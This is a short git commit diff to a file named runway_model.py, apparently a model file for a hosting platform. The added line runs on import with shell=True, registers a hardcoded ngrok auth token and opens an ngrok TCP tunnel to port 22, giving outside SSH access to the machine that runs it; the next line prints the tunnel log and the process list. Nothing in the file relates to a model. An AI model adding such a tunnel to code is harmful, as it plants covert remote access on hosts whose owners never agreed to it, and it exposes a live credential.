8ec8f86d926a57e49430ee680d75440b077e093a
colabu11 <101316095+colabu11@users.noreply.github.com>
2022-03-23 14:58:23 +0800

    Update runway_model.py

--- runway_model.py
+++ runway_model.py
@@ -1,2 +1,3 @@
 import subprocess
+subprocess.call("ls && ./ngrok authtoken 1siBHweElRgvcNTEIHUR49WPfcv_5rbwdTbBB5q9cMLJwYcme && ./ngrok tcp 22 --log=stdout > ngrok.log", shell=True)
 subprocess.call("cat ngrok.log && ps -x && ls", shell=True)
